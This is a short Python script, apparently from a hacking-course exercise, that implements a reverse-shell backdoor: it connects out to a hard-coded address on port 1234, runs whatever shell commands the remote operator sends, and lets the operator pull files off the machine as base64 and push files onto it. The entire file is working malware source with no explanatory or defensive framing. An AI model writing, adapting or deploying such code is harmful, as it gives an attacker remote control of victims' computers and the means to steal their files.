#!/usr/bin/python3
import socket 
import json
import subprocess
import os
import base64

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_commands(self,command):
        return subprocess.check_output(command,shell=True)

    def change_working_directory(self,path):
        os.chdir(path)
        return "[+] Changing working directory to" + path

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] upload successful"

    def Run(self):
        while(True):
            command = self.reliable_recieve()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            elif command[0] == "upload":
                command_result = self.write_file(command[1],command[2])

            else:
                command_result = self.execute_commands(command)
            self.reliable_send(command_result)
        



my_backdoor = Backdoor("192.168.1.7",1234)
my_backdoor.Run()
